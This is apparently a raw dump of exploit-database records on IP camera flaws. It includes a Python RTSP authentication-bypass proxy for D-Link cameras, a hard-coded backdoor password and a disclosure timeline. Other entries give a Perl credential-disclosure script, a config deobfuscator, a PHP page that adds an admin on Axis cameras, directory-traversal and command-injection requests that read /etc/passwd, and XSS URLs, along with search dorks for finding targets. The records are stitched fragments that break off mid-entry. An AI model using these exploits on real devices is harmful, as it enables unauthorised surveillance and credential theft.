listener.bind(('', self.src_port))
while 1:
try:
data, recv_addr = listener.recvfrom(1024)
if not data: break
UDPRequestHandler(data, recv_addr, self.dst_addr).start()
except Exception as e:
print e
break
listener.close()
UDPDispatcher.dispatchers.remove( self )
class PipeThread(Thread):
pipes = []
def __init__(self, source, sink, process_data_callback=lambda x: x):
Thread.__init__(self)
self.source = source
self.sink = sink
self.process_data_callback = process_data_callback
PipeThread.pipes.append(self)
def run(self):
while 1:
try:
data = self.source.recv(1024)
data = self.process_data_callback(data)
if not data: break
self.sink.send( data )
except Exception as e:
log(e)
break
PipeThread.pipes.remove(self)
class TCPTunnel(Thread):
def __init__(self, src_port, dst_addr, process_data_callback=lambda
x: x):
Thread.__init__(self)
log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
dst_addr[0], dst_addr[1]))
self.dst_addr = dst_addr
self.process_data_callback = process_data_callback
self.sock = socket(AF_INET, SOCK_STREAM)
self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
self.sock.bind(('', src_port))
self.sock.listen(5)
def run(self):
while 1:
newsock, address = self.sock.accept()
fwd = socket(AF_INET, SOCK_STREAM)
fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
fwd.connect(self.dst_addr)
PipeThread(newsock, fwd, self.process_data_callback).start()
PipeThread(fwd, newsock, self.process_data_callback).start()
class Camera():
def __init__(self, address):
self.address = address
def get_describe_data(self):
return ''
class DLink(Camera):
def __init__(self, address):
Camera.__init__(self, address)
def get_describe_data(self):
return
'\x76\x3d\x30\x0d\x0a\x6f\x3d\x43\x56\x2d\x52\x54\x53\x50\x48\x61\x6e\x64\x6c\x65\x72\x20\x31\x31\x32\x33\x34\x31\x32\x20\x30\x20\x49\x4e\x20\x49\x50\x34\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x2e\x31\x31\x0d\x0a\x73\x3d\x44\x43\x53\x2d\x32\x31\x30\x32\x0d\x0a\x63\x3d\x49\x4e\x20\x49\x50\x34\x20\x30\x2e\x30\x2e\x30\x2e\x30\x0d\x0a\x74\x3d\x30\x20\x30\x0d\x0a\x61\x3d\x63\x68\x61\x72\x73\x65\x74\x3a\x53\x68\x69\x66\x74\x5f\x4a\x49\x53\x0d\x0a\x61\x3d\x72\x61\x6e\x67\x65\x3a\x6e\x70\x74\x3d\x6e\x6f\x77\x2d\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x2a\x0d\x0a\x61\x3d\x65\x74\x61\x67\x3a\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30\x0d\x0a\x6d\x3d\x76\x69\x64\x65\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x39\x36\x0d\x0a\x62\x3d\x41\x53\x3a\x31\x38\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x39\x36\x20\x4d\x50\x34\x56\x2d\x45\x53\x2f\x39\x30\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x31\x0d\x0a\x61\x3d\x66\x6d\x74\x70\x3a\x39\x36\x20\x70\x72\x6f\x66\x69\x6c\x65\x2d\x6c\x65\x76\x65\x6c\x2d\x69\x64\x3d\x31\x3b\x63\x6f\x6e\x66\x69\x67\x3d\x30\x30\x30\x30\x30\x31\x42\x30\x30\x31\x30\x30\x30\x30\x30\x31\x42\x35\x30\x39\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30\x30\x43\x34\x38\x38\x42\x41\x39\x38\x35\x31\x34\x30\x34\x33\x43\x31\x34\x34\x33\x46\x3b\x64\x65\x63\x6f\x64\x65\x5f\x62\x75\x66\x3d\x37\x36\x38\x30\x30\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a\x6d\x3d\x61\x75\x64\x69\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x30\x20\x50\x43\x4d\x55\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x32\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a'
class RTSPAuthByPasser():
DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
SERVER_PORT_ARGUMENTS = 'server_port='
DEFAULT_CSEQ = 1
DEFAULT_SERVER_PORT_RANGE = '5556-5559'
def __init__(self, local_port, camera):
self.last_describe_req = ''
self.camera = camera
self.local_port = local_port
def start(self):
log('[!] Starting bypasser')
TCPTunnel(self.local_port, self.camera.address,
self.spoof_rtsp_conn).start()
def spoof_rtsp_conn(self, data):
if RTSPAuthByPasser.DESCRIBE_REQ_HEADER in data:
self.last_describe_req = data
elif RTSPAuthByPasser.UNAUTHORIZED_RESPONSE in data and
self.last_describe_req:
log('[!] Unauthorized response received. Spoofing...')
spoofed_describe = self.camera.get_describe_data()
m = re.search('.*CSeq:\\s*(\\d+?)\r\n.*',
self.last_describe_req)
cseq = m.group(1) if m else RTSPAuthByPasser.DEFAULT_CSEQ
data = 'RTSP/1.0 200 OK\r\n'
data+= 'CSeq: %s\r\n' % cseq
data+= 'Content-Type: application/sdp\r\n'
data+= 'Content-Length: %d\r\n' % len(spoofed_describe)
data+= '\r\n'
data+= spoofed_describe
elif RTSPAuthByPasser.SERVER_PORT_ARGUMENTS in data:
m = re.search('.*%s\\s*(.+?)[;|\r].*' %
RTSPAuthByPasser.SERVER_PORT_ARGUMENTS, data)
ports = m.group(1) if m else
RTSPAuthByPasser.DEFAULT_SERVER_PORT_RANGE
begin_port, end_port = map(int, ports.split('-'))
for udp_port in xrange(begin_port, end_port + 1):
try:
UDPDispatcher(udp_port, (self.camera.address[0],
udp_port)).start()
except:
pass
return data
if __name__ == '__main__':
if len( sys.argv ) > 1:
listener_port = camera_port = int(sys.argv[1])
camera_ip = sys.argv[2]
if len(sys.argv) == 4:
camera_port = int(sys.argv[3])
RTSPAuthByPasser(listener_port, DLink((camera_ip,
camera_port))).start()
else:
print 'usage: python %s [local_port] [camera_ip]
[camera_rtsp_port]'
7.5. *RTSP Hard-Coded Credentials*
[CVE-2013-1603] RTSP service contains hard-coded credentials that
effectively serve as a backdoor, which allows remote attackers to access
the RTSP video stream.
username: (any)
password: ?*
As we can see in the following dump, the submitted password is compared
with the string ':?*' (the character ':' is used for concatenation of
'username:password'). This code belongs to the binary 'rtspd':
.text:00011468 loc_11468               ; Load from Memory
.text:00011468 LDR     R3, [R11,#s2]
.text:0001146C STR     R3, [R11,#var_C0] ; Store to Memory
.text:00011470 LDR     R2, [R11,#var_C0] ; Load from Memory
.text:00011474 LDR     R3, [R11,#var_BC] ; Load from Memory
.text:00011478 ADD     R3, R2, R3      ; Rd = Op1 + Op2
.text:0001147C SUB     R3, R3, #3      ; Rd = Op1 - Op2
.text:00011480 STR     R3, [R11,#var_C0] ; Store to Memory
.text:00011484 LDR     R0, [R11,#var_C0] ; s1
.text:00011488 LDR     R1, =asc_1B060  ; "":?*""      <-------
.text:0001148C MOV     R2, #3          ; n
.text:00011490 BL      strncmp         ; Branch with Link
.text:00011494 MOV     R3, R0          ; Rd = Op2
.text:00011498 CMP     R3, #0          ; Set cond. codes on Op1 - Op2
.text:0001149C BNE     loc_114BC       ; Branch
8. *Report Timeline*
. 2013-03-19:
Core Security Technologies notifies the D-Link team of the vulnerability.
. 2013-03-20:
D-Link team asks for a technical description of the vulnerability.
. 2013-03-20:
Core sends a draft advisory with technical details and set the estimated
publication date of the advisory for May 14th, 2013.
. 2013-03-20:
Vendor notifies that D-Link Corporation has an unpublished bounty
program for security advisors. The bounty program requires both Core
Security and D-Link to sign a memo of understanding (MoU).
. 2013-03-25:
Core notifies that receiving money from vendors may bias the view of the
report and rejects the bounty program.
. 2013-03-29:
Vendor notifies that they hope to close the fix ASAP.
. 2013-04-08:
Vendor sends the list of vulnerable devices and the associated firmware
and notifies that they will release patches and release notes on the
D-Link support forum first. Then, an official public release will be
announced (approx. 1 month from forum post to full release).
. 2013-04-24:
Core asks for a clarification regarding the D-Link release date and
notifies that releasing fixes to a privileged closed group and/or a
closed forum or list is unacceptable.
. 2013-04-25:
Vendor notifies that the patches are ready and scheduled for posting on
D-Link web site over the next few days.
. 2013-04-26:
Core notifies that the advisory is re-scheduled for Monday 29th.
. 2013-04-29:
Advisory CORE-2013-0303 published.
9. *References*
[1] http://www.dlink.com/us/en/home-solutions/view/network-cameras.
[2]
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-03-22,WebApps,Hardware,Todor Donev,StarVedia IPCamera IC502w IC502w+ v020313,'Username'/Password Disclosure,"#!/usr/bin/perl
#  [+] StarVedia IPCamera IC502w IC502w+ v020313 remote bypass username/password disclosure exploit
#  Author: Todor Donev
#  Email: todor.donev at gmail dot com
#  Type: Hardware
#  Thanks to Tsvetelina Emirska the best friend in my life
#  and all my other friends for the help and support which
#  gives me. Kind regards to all of you, who read my lil'
#  exploits.
#  Bulgaria, Sofia
#  03.2013
#  Shodanhq r0x 4 teh lulz!!
#  http://www.youtube.com/watch?v=qNyN1AY-YZQ  Cheeerzz =))
#  Another bug, hint: you can edit this code and add some lines for remote change the password.","use LWP::Simple;
if (@ARGV == 0) {&usg;}
while (@ARGV > 0) {
$type = shift(@ARGV);
$t = shift(@ARGV);
if ($type eq ""-d"") {
my $r = get(""http://$t/cgi-bin/passwd.cgi?"") or die("" $t: Not vulneruble, $!\n"");
print "" [+] StarVedia IPCamera IC502w IC502w+ v020313 remote bypass username/password disclosure exploit\n"";
print "" [!] Exploiting: $t\n"";
if ($r =~ m/<INPUT type=text name=user size=20 maxlength=19 value=""(.*)"">/g) {
$result .= ""   [o] User: $1\n"";
}else{die("" Try another exploit, $!"");}
if ($r =~ m/<INPUT type=password name=passwd size=20 maxlength=19 value=""(.*)"">/g){
$result .= ""   [o] Password: $1\n"";
}else{die(""Try another exploit or restart the exploit\n"");}
sleep(1);
print "" [\\m/] BINGO!!!\n\a"".$result;
sub usg(){
print "" [!] usg: perl $0 [-r or -d] <victim:port>\n"";
print "" [!]  -d: disclosure password option\n"";
print "" [!] exp: perl $0 -d 127.0.0.1 :)\n"";
exit;"
2013-01-31,WebApps,Hardware,Roberto Paleari,D-Link DCS Cameras,Multiple Vulnerabilities,"http://<device IP address>/frame/GetConfig
# 'data' holds the content of the obfuscated configuration file","Unauthenticated remote access to D-Link DCS cameras
[ADVISORY INFORMATION]
Title:    Unauthenticated remote access to D-Link DCS cameras
Discovery date: 20/06/2012
Release date:   28/01/2013
Credits:        Roberto Paleari (roberto@greyhats.it, twitter: @rpaleari)
[VULNERABILITY INFORMATION]
Class:           Authentication bypass, Remote command execution
[AFFECTED PRODUCTS]
This security vulnerability affects the following products and firmware
versions:
* D-Link DCS-930L, firmware version 1.04
* D-Link DCS-932L, firmware version 1.02
Other products and firmware versions are probably also vulnerable, but they
were not checked.
[VULNERABILITY DETAILS]
D-Link DCS web cameras allow unauthenticated attackers to obtain the
configuration of the device remotely. A copy of the device configuration can be
obtained by accessing the following URL:
The obtained configuration file is obfuscated using a trivial obfuscation
scheme. Python code for the deobfuscation follows (sorry, the code is quite a
mess :-)):
<cut>
def deobfuscate(data):
r = []
for c in data:
c = ord(c)
c = (c + ord('y')) & 0xff
c = (c ^ ord('Z')) & 0xff
c = (c - ord('e')) & 0xff
r.append(c)
tmp = None
i = len(r) - 1
while i >= 0:
if i == len(r) - 1:
x = r[i]
tmp = ((x & 7) << 5) & 0xff
if i == 0:
assert tmp is not None
x = r[0]
x = (x >> 3) & 0xff
x = (x + tmp) & 0xff
r[0] = x
else:
c1 = r[i-1]
c2 = r[i]
c1 = c1 & 0x7
c2 = (c2 >> 3) & 0xff
c1 = (c1 << 5) & 0xff
c2 = (c2 + c1) & 0xff
r[i] = c2
i = i - 1
r = """".join([chr(x) for x in r])
s = """"
assert (len(r) % 2) == 0
for i in range(len(r)/2):
s += r[i+(len(r)/2)] + r[i]
return s
</cut>
The above procedure returns the deobfuscated ASCII version of the
configuration file. This file includes, among other things, also the web
password for the ""admin"" user.
As a side note, it is worth considering that, after exploiting this issue,
authenticated attackers can also leverage the undocumented /docmd.htm web page
to execute arbitrary commands on the affected devices.
[REMEDIATION]
This issue has been addressed by D-Link in the following firmware releases:
* DCS-930L V1.06B5 (August 15, 2012)
* DCS-932L V1.04B5 (August 15, 2012)
These updates are available through mydlink.com and have also been implemented
on DCS-942L and higher camera products.
[DISCLOSURE TIME-LINE]
* 20/06/2012 - Initial vendor contact.
* 11/07/2012 - The author provided D-Link with the details of the
vulnerability.
* 12/07/2012 - D-Link confirmed the issue is a new security vulnerability.
* 26/01/2013 - D-Link confirmed the release of firmware versions that
address the vulnerability.
* 28/01/2013 - Public disclosure.
[DISCLAIMER]
The author is not responsible for the misuse of the information provided in
this security advisory. The advisory is a service to the professional security
community. There are NO WARRANTIES with regard to this information. Any
application or distribution of this information constitutes acceptance AS IS,
at the user's own risk. This information is subject to change without notice."
2004-08-23,WebApps,CGI,bashis,Axis Network Camera 2.x And Video Server 1-3,HTTP Authentication Bypass,"source: https://www.securityfocus.com/bid/11011/info
#          03/11/2007 | 3:00        #
#    |#|axisNC.php        #
#          |#|Axis Network Camera HTTP Authentication Bypass|#|
#                          Exploit:        #
#              plz help as friend to ours new project iam or maroc
#                         By  ConcorDHacK and xcoder            #
#                    moroccan-hackers-sabotage.co.ma
#|    Remplace [IP]or[Hostname] by onother IP or Hostname    #
#          |#|Affected Products|#|       #
#           #
# AXIS 2100 Network Camera versions 2.32 and previous    #
# AXIS 2110 Network Camera versions 2.32 and previous    #
# AXIS 2120 Network Camera versions 2.32 and previous    #
# AXIS 2130 PTZ Network Camera versions 2.32 and previous    #
# AXIS 2400 Video Server versions 2.32 and previous    #
# AXIS 2401 Video Server versions 2.32 and previous    #
# AXIS 2420 Network Camera versions 2.32 and previous    #
# AXIS 2460 Network DVR versions 3.00 and previous    #
# AXIS 250S Video Server versions 3.02 and previous    #
# i know this exploit its old but the new is if add new password
#    |#|Google dork : intitle:""Axis 2100 Network Camera"" ....       #
#           #
#1CB081;background-color:black;}body{font-size:8pt;background-color:
http://www.hackzord-security.fr.tc""><font color=""red""><i><u>[
www.hackzord-security.fr.tc]</a></B></FONT>","A hardcoded backdoor administrative-user issue allows remote attackers to administer affected devices. This likely cannot be disabled.
This issue is reported to affect:
- Axis StorePoint CD E100 CD-ROM Server with firmware version 5.30
<?php
telecom
company                                    #
this password give you ftp access
!!!!!!!!!!!!!!!!!!!!!!!!!          #
error_reporting(0);
ini_set(""max_execution_time"",0);
ini_set(""default_socket_timeout"", 2);
ob_implicit_flush (1);
<style
type=""text/css"">body{background-color:black;
SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black; color:   red; } img
{background-color:#FFFFFF}
input  {background-color:black} option{ background-color: black}
textarea
{background-color: black } input {color: red } option {color: red
}textarea
{color: red }checkbox{background-color: black }select {font-weight:
normal;
color:
black;body * {font-size: 8pt } h1 {font-size:0.8em }h2{font-size:0.8em}
h3
{font-size: 0.8em} h4,h5,h6{font-size:0.8em}h1 font{font-size:0.8em}h2
font
{font-size:0.8em } h3 font {font-size:  0.8em}h4 font,h5  font,h6
font
{font-size:  0.8em } *  {font-style:  normal }    *{text-decoration:
none }
a:link,a:active,a:visited{ text-decoration: none ; color : black; }
a:hover
{text-decoration: underline;color : black; } .Stile5 {font-family:
Verdana,
Arial, Helvetica,  sans-serif;  font-size: 10px; }  .Stile6
{font-family:
Verdana,  Arial,  Helvetica,     sans-serif;font-weight:bold;
font-style:
italic;}--></style>
<script LANGUAGE=""JavaScript"">
var password = new Array(20)
function formatPassword(pwString)
var code
var pwCoded = """"
for (var i=0; i<pwString.length; i++) {
code = pwString.charCodeAt(i)
if (code < 10)
pwCoded += ""00"" + code
else if (code < 100)
pwCoded += ""0"" + code
else
pwCoded += code
return pwCoded
function parseUsers()
var form = document.WizardForm
var list = form.users
var str = form.conf_Security_List.value
var name
var rights
var pwCoded
var pwString
var noOfUsers = 0
var index = str.indexOf("":"")
list.length = 0
while (!(index == -1)) {
name = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
index = str.indexOf("":"")
rights = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
index = str.indexOf("":"")
pwCoded = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
pwString = """"
list.length++
list.options[noOfUsers].value = name
if (rights.length > 0)
list.options[noOfUsers].text = name + "":"" + rights
else
list.options[noOfUsers].text = name
password[noOfUsers] = pwString
noOfUsers++
index = str.indexOf("":"")
function formatUsers()
var form = document.WizardForm
var list = form.users
var str = """"
for (var i=0; i<list.length; i++) {
str = str + list.options[i].text
if (isAdmin(i) || isView(i) || isDial(i))
str += "":""
else
str += ""::""
str +=  formatPassword(password[i]) + "":""
form.conf_Security_List.value = str
function contains(ch, index)
var form = document.WizardForm
var list = form.users
var text = list.options[index].text
var lenValue = list.options[index].value.length
var lenText  = text.length
if (lenValue == lenText) {
return false  // No user rights
} else {
for (var i=lenValue+1; i<lenText; i++) {
if (text.charAt(i) == ch) {
return true
return false
function isAdmin(index)
return contains(""A"", index)
function isView(index)
return contains(""V"", index)
function isDial(index)
return contains(""D"", index)
function UserChange()
var form = document.WizardForm
var list = form.users
var index = list.selectedIndex
form.username.value = list.options[index].value
form.password1.value = password[index]
form.password2.value = password[index]
form.checkAdmin.checked = isAdmin(index)
form.checkDial.checked = isDial(index)
form.checkView.checked = isView(index)
function deleteUser()
var list = document.WizardForm.users
if ((list.selectedIndex != -1) &&
(list.options[list.selectedIndex].text.substr(0,4)
== ""root"")) {
alert(""The 'root' user cannot be deleted."")
} else if (!(list.selectedIndex == -1)) {
for (var i = list.selectedIndex; i<list.length-1 ; i++) {
list.options[i].text = list.options[i+1].text
list.options[i].value = list.options[i+1].value
password[i] = password[i+1]
list.length--
if (list.selectedIndex == -1)
list.selectedIndex = list.length-1
UserChange()
function addUserButton()
addUser(false)  // false means that an empty user is not accepted
function addUser(ignoreEmptyUser)
var form = document.WizardForm
var list = form.users
var newUser
var index = -1
if ((ignoreEmptyUser) && (form.username.value == """"))
return 1
if (list.length == 20) {
alert(""It is not possible to add more than 20 users."")
form.username.select()
form.username.focus()
return 0
if (list.length == 1 && list.options[0].value == """")
index = 0
else {
for (var i = 0; i<list.length ; i++) {
if (list.options[i].value == form.username.value)
index = i
newUser = (index == -1)
if ((checkUserName() == 1) && (checkPasswords(newUser) == 1) &&
(checkRights() == 1)) {
if (newUser) {
index = list.length
list.length++
list.options[index].value = form.username.value
list.options[index].text = form.username.value + strRights()
password[index] = form.password1.value
} else {
return 0
list.selectedIndex = index
return 1
function clearUser()
var form = document.WizardForm
form.username.value = """"
form.password1.value = """"
form.password2.value = """"
function strRights()
var form = document.WizardForm
var str = "":""
if (!(form.checkAdmin.checked || form.checkDial.checked ||
form.checkView.checked))
return """"
if (form.checkAdmin.checked)
str += ""A""
if (form.checkDial.checked)
str += ""D""
if (form.checkView.checked)
str += ""V""
return str
function checkUserName()
var form = document.WizardForm
var aName = form.username.value
var c
for (var i = 0; i < aName.length; i++)
c = aName.charAt(i)
return 1
function checkPasswords(newUser)
var form = document.WizardForm
var aPass1 = form.password1.value
var aPass2 = form.password2.value
var c
return 1
function checkRights()
var form = document.WizardForm
var aAdmin = form.checkAdmin
var aDial = form.checkDial
var aView = form.checkView
if (!(aAdmin.checked || aDial.checked || aView.checked)) {
alert(""Select User Rights before adding user."")
aAdmin.focus()
aAdmin.select()
return 0
return 1
</script>
<script LANGUAGE=""JavaScript"">
function onLoad()
parseUsers()
function saveData()
var form = document.WizardForm
if (addUser(true) == 1) {  // true means ""ignore empty user""
formatUsers()
form.submit()
</script>
</HEAD>
<BODY BGCOLOR=""black"" LINK=""gray"" VLINK=""gray"" ALINK=""gray""
ONLOAD=""onLoad()"">
<TABLE BORDER=""0"" WIDTH=""1100"" HEIGHT=""400"" CELLSPACING=""0""
CELLPADDING=""0"">
<TR><TD COLSPAN=""2"">
<FORM ACTION=""http://194.168.163.96//this_server/ServerManager.srv""
METHOD=""POST"" NAME=""WizardForm"">
<TABLE BORDER=""0"" CELLSPACING=""0"" CELLPADDING=""0"">
<TR><TD COLSPAN=""2"">
<INPUT TYPE=""hidden"" NAME=""conf_Security_List"" VALUE=""root:ADVO::"">
<FONT FACE=""ARIAL, GENEVA"" SIZE=""2""><B>A script By ConcorDHacK <br><a
href=""
</TD><BR><BR></TR><TR><TD COLSPAN=""2""><FONT FACE=""Arial, Geneva""
SIZE=""2""><SELECT NAME=""users"" SIZE=""2"" onchange=""UserChange()"">
<OPTION value=""Dummy"">WWWWWWWWWW:ADV
</SELECT></FONT></TD><TD></TD><TR><TD
COLSPAN=""2""></TD><TD></TD></TR><TR><TD
COLSPAN=""4""><HR></TD></TR><TR><TD><FONT FACE=""Arial, Geneva""
SIZE=""2""><b>New
Admin:</FONT></TD>
<TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><INPUT name=""username""
type=""text""
size=""30""> (Ex : ConcorDHacK or just root)</FONT></TD>
</TR><TR><TD><FONT FACE=""Arial, Geneva""
SIZE=""2""><b>Password:</FONT></TD><TD><FONT FACE=""Arial, Geneva""
SIZE=""2""><INPUT name=""password1"" type=""password"" size=""30"">
Password of your choice (Ex : 123456 )</FONT></TD>
</TR><TR><TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><b>Verify:</FONT></TD>
<TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><INPUT name=""password2""
type=""password"" size=""30""> Confirm your password</FONT></TD>
</TR><TR><TD><FONT FACE=""Arial, Geneva""
SIZE=""2""><b>Signature:</FONT></TD>
<TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><INPUT name=""conf_Image_UseText""
type=""text"" size=""30"" value=""""> Your signature in the administration by
HTML/Javascript code  after ""> (Ex : "">
<script>alert(""LOL"")</script></pre></FONT></TD>
</TR><TR><TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><b>User Rights:
</FONT></TD><TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><INPUT
NAME=""checkAdmin""
TYPE=""checkbox""><b>Admin
<TR><TD></TD><TD><FONT FACE=""Arial, Geneva"" SIZE=""2""><INPUT
NAME=""checkDial""
TYPE=""checkbox""><b> Dial-in </TD></TR></font><TR><TD></TD><TD><FONT
FACE=""Arial, Geneva"" SIZE=""2"">
<INPUT NAME=""checkView"" TYPE=""checkbox""><b> View
</TD></TR></FONT></TD></TR><TR><TD COLSPAN=""2"" ALIGN=""center""><br>
<table border=""0"" cellspacing=""1"" cellpadding=""1""
width=""300""bgcolor=""#ffffff""><tr><td bgcolor=""red"" width=""20%""
height=""16""><center><b><font color=""black""><A
HREF=""javascript:saveData()"">-=[Go!Go!]=-</A></font></td>
</TD></TR></TABLE><INPUT TYPE=""HIDDEN"" NAME=""servermanager_return_page""
VALUE=""/admin/setgen/security.shtml"">
<INPUT TYPE=""HIDDEN"" NAME=""servermanager_do""
VALUE=""set_variables""></FORM></TD></TR></TABLE></BODY></HTML>"
2004-08-23,WebApps,CGI,bashis,Axis Network Camera 2.x And Video Server 1-3,Directory Traversal,source: https://www.securityfocus.com/bid/11011/info,"A directory-traversal vulnerability in HTTP POST requests. This attack is demonstrated by an anonymous user calling protected administration scripts. This bypasses authentication checks and gives anonymous users remote adminitration of the devices.
This issue is reported to affect:
- Axis 2100, 2110, 2120, 2420 network cameras with firmware versions 2.12 thru 2.40
- Axis 2130 network cameras
- Axis 2401,and 2401 video servers
POST /cgi-bin/scripts/../../this_server/ServerManager.srv HTTP/1.0
Content-Length: 250
Pragma: no-cache
conf_Security_List=root%%3AADVO%%3A%%3Awh00t%%3AAD%%3A119104048048116%%3A&users=wh00t&username=wh00t&password1=wh00t&password2=wh00t&checkAdmin=on&checkDial=on&checkView=on&servermanager_return_page=%%2Fadmin%%2Fsec_users.shtml&servermanager_do=set_variables"
2004-08-23,WebApps,CGI,bashis,Axis Network Camera 2.x And Video Server 1-3,'virtualinput.cgi' Arbitrary Command Execution,"source: https://www.securityfocus.com/bid/11011/info
http://www.example.com/axis-cgi/io/virtualinput.cgi?\x60cat</etc/passwd>/mnt/flash/etc/httpd/html/passwd\x60","1. A shell metacharacter command-execution vulnerability allows an anonymous user to download the contents of the '/etc/passwd' file on the device. Other commands are also likely to work, facilitating other attacks.
This issue is reported to affect:
- Axis 2100, 2110, 2120, 2420 network cameras with firmware versions 2.34 thru 2.40
- Axis 2130 network cameras
- Axis 2401 and 2401 video servers"
2004-06-14,WebApps,CGI,scriptX,Linksys Web Camera Software 2.10,'Next_file' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/10533/info
http://www.example.com/main.cgi?next_file=poop<script>alert('scriptX :P');</script>","It is reported that Linksys Web Camera software is prone to a cross-site scripting vulnerability that may allow a remote attacker to steal cookie-based authentication credentials or carry out other attacks.
The problem presents itself when an attacker passes malicious HTML or script code to the application via the 'next_file' parameter of the 'main.cgi' script.
Linksys Web Camera software version 2.10 is reportedly prone to this issue, however, it is possible that other versions are affected as well."
2004-06-07,WebApps,CGI,John Doe,Linksys Web Camera Software 2.10,'Next_file' File Disclosure,"source: https://www.securityfocus.com/bid/10476/info
http://www.example.com/main.cgi?next_file=/etc/passwd","It is reported that Linksys Web Camera software is prone to a remote file disclosure vulnerability that may allow a remote attacker to disclose sensitive files.
Linksys Web Camera software version 2.10 is reportedly prone to this issue, however, it is possible that other versions are affected as well."
2003-05-27,Remote,Hardware,Juliano Rizzo,Axis Network Camera 2.x,HTTP Authentication Bypass,"source: https://www.securityfocus.com/bid/7652/info
http://camera-ip//admin/admin.shtml","A vulnerability has been discovered in various Axis Communications products. By making a request for a specially formatted URL, it may be possible for remote users to access the administrative configuration interface without being prompted for authentication."
2012-07-16,WebApps,Hardware,GothicX,Vivotek Cameras,Sensitive Information Disclosure,"# Date: 09/07/12
# Author: Alejandro Leon Morales  [GothicX]
# Author Mail: Gothicx[at]freaknetwork[dot]in
# Author Web: www.undermx.blogspot.mx
# Sofware web: www.vivotek.com
# Vulnerable version: all
# Tested on:  Microsoft windows 7 / Vista / XP/ MacOS
# Dork:    ""/setup/config.html""  ||allinurl:""setup/parafile.html""
http://server/cgi-bin/admin/getparam.cgi","Exploit Title: Vivotek Full Data Source CONFIG
[PoC]
[INFO SENSIBLE]
ACCOUNT FTP
ACCOUNT DYNDNS
[Result]
ddns_enable='1'
ddns_provider='DyndnsDynamic'
ddns_Safe100_hostname=''
ddns_Safe100_usernameemail=''
ddns_Safe100_passwordkey=''
ddns_DyndnsDynamic_hostname='hostname'
ddns_DyndnsDynamic_usernameemail='usernameemail'
ddns_DyndnsDynamic_passwordkey='passwordkey'
ddns_DyndnsCustom_hostname=''
ddns_DyndnsCustom_usernameemail=''
ddns_DyndnsCustom_passwordkey=''
ddns_TZO_hostname=''
ddns_TZO_usernameemail=''
ddns_TZO_passwordkey=''
ddns_DHS_hostname=''
ddns_DHS_usernameemail=''
ddns_DHS_passwordkey=''
ddns_DynInterfree_hostname=''
ddns_DynInterfree_usernameemail=''
ddns_DynInterfree_passwordkey=''
ddns_CustomSafe100_hostname=''
ddns_CustomSafe100_usernameemail=''
ddns_CustomSafe100_passwordkey=''
ddns_CustomSafe100_servername=''
server_i0_type='ftp'
server_i0_http_url='http://'
server_i0_http_username=''
server_i0_http_passwd=''
server_i0_ftp_address='FTPADDRESS'
server_i0_ftp_username='FTPUSERNAME'
server_i0_ftp_passwd='FTPPASSWD'
server_i0_ftp_port='21'
server_i0_ftp_passive='1'
server_i0_ftp_location='\\temp\\record'
[Sensitive data]
FTP ACCOUNTS:  server_i0_ftp_address='FTPADDRESS'
server_i0_ftp_username='FTPUSERNAME'
server_i0_ftp_passwd='FTPPASSWD'
DYNDNS ACCOUNTS: ddns_DyndnsDynamic_hostname='hostname'
ddns_DyndnsDynamic_usernameemail='usernameemail'
ddns_DyndnsDynamic_passwordkey='passwordkey'
Special Greetz: Maztor, Zeus, Klanx, Makuaz, Alverid, zer0 z0org"
2012-04-06,Remote,Windows,Metasploit,TRENDnet SecurView Internet Camera,UltraMJCam OpenFileDlg Buffer Overflow (Metasploit),"# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
